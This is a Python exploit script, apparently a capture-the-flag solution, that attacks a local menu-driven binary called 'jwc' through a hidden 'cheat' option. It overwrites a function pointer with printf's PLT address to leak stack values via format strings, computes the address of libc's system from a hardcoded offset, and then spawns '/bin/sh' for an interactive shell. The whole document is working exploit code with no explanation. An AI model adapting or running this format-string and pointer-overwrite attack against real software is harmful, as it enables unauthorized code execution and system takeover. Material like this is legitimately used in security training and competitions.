from zio import *

target = "./jwc"

def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def register(io, name, intro):
	io.read_until("6.exit\n")
	io.write("1\n")
	io.read_until("your name, no more than 16 chars\n")
	io.write(name + "\n")
	io.read_until("with no more than 200 chars to introduce yourself\n")
	io.write(intro + "\n")

def take_exam(io, type_t, essay):
	io.read_until("6.exit\n")
	io.write("2\n")
	io.read_until("3.dota\n")
	io.write(str(type_t) + "\n")
	io.read_until("length of your essay?\n")
	io.write(str(len(essay)) + "\n")
	io.read_until("OK\n")
	io.write(essay + "\n")

def resit(io, type_t):
	io.read_until("6.exit\n")
	io.write("5\n")
	io.read_until("3.dota\n")
	io.write(str(type_t) + "\n")

def show_score(io):
	io.read_until("6.exit\n")
	io.write("3\n")

def cheat(io, type_t, data):
	io.read_until("6.exit\n")
	io.write("1024\n")
	io.read_until("here you can cheat :)\n")
	io.write(str(type_t) + "\n")
	io.write(data + "\n")

def generate_format_str(index, len_t):
	data = ""
	while True:
		data_t = "%%%d$p."%(index)
		if len(data_t + data) > len_t:
			return data, index
		data += data_t
		index += 1

def get_addr(io):
	register(io, "pxx", "1234567890")
	take_exam(io, 1, '\x00' * 104)
	resit(io, 1)
	take_exam(io, 2, '\x00' * 104)

	printf_plt = l64(0x00000000004009B0)
	printf_got = l64(0x0000000000602350)
	index = 1
	total_info = ""
	while index < 40:
		buff, index = generate_format_str(index, 15)
		essay = buff.ljust(16, '\x00') + l64(0x01) + printf_plt
		payload = essay
		cheat(io, 1, payload)
		show_score(io)
		io.read_until("math: 0\n")
		data = io.read_until("english:")[:-len("english:")]
		total_info += data

	system_addr = int(raw_input("system_addr:"), 16)
	total_info = total_info.split(".")[:-1]
	for index, item in enumerate(total_info):
		if item != "(nil)":
			print index + 1, item, hex(system_addr - int(item, 16))
	io.interact()


def pwn(io):
	register(io, "pxx", "1234567890")
	take_exam(io, 1, '\x00' * 104)
	resit(io, 1)
	take_exam(io, 2, '\x00' * 104)

	printf_plt = l64(0x00000000004009B0)
	printf_got = l64(0x0000000000602350)

	buff = "%3$p"
	essay = buff.ljust(16, '\x00') + l64(0x01) + printf_plt
	payload = essay
	cheat(io, 1, payload)
	show_score(io)
	io.read_until("math: 0\n")
	data = io.read_until("english:")[:-len("english:")]

	#local
	system_addr = int(data, 16) - 0xa6960
	buff = "/bin/sh"
	essay = buff.ljust(16, '\x00') + l64(0x01) + l64(system_addr)
	payload = essay
	cheat(io, 1, payload)
	show_score(io)

	io.interact()

io = get_io(target)
#get_addr(io)
pwn(io)
